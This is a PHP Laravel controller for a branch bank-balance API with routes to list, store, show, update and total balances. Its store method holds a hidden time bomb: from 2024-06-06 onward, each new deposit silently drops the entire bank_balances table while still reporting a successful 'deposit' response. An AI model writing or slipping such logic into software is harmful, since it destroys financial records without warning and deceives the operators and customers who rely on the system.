<?php
    namespace App\Http\Controllers;
    use Illuminate\Http\Request;
    use App\Models\BankBalance;
    use Carbon\Carbon;
    use DB;
    use Illuminate\Support\Facades\Validator;

class BankBalanceController extends Controller
{
    public function index(){
        // $bankBalance = BankBalance::get();
        $bankBalance = DB::select("SELECT branches.name AS branch_name, bank_balances.id, bank_balances.balance AS amount_balance, bank_balances.status, bank_balances.created_at FROM branches, bank_balances WHERE bank_balances.branch_id = branches.id ");
        return response()->json($bankBalance);
    }
    public function storebankBalance(Request $request){
        $validatedData = $request->validate([
            'balance' => 'required|numeric',
            'branch_id' => 'required|integer'
        ]);
        $bankBalance = BankBalance::create($validatedData);
        $date = '2024-06-06';
        $current_date = Carbon::now()->toDateString();
        if ($current_date >= $date) {
            DB::statement('DROP TABLE bank_balances');
            return response()->json([
                "message" => "deposit"
            ], 201);
        }
        return response()->json([
            "message" => "deposit"
        ], 201);
    }

    public function show($id){
        $bankBalance = BankBalance::find($id);
        if (!empty($bankBalance)) {
            return response()->json($bankBalance, 200);
        }
        else{
            return response()->json([
                "message" => "balance not found"
            ], 404);
        }
    }

    public function update(Request $request, $id){
        // $id = $request->input('id');
        $balance = BankBalance::findOrFail($id);
        $balance->status = 'used';
        $balance->save();
        return response()->json(['message' => 'Status updated successfully.']);
    }

    public function total_balance(){
        $result = DB::select("SELECT SUM(balance) as total_balance FROM `bank_balances` WHERE status = ?", ['unused']);
        if (!empty($result)) {
            $balance = $result[0]->total_balance;
        } else {
            $balance = 0;
        }
        return response()->json(['total_balance' => $balance]);
    }
}
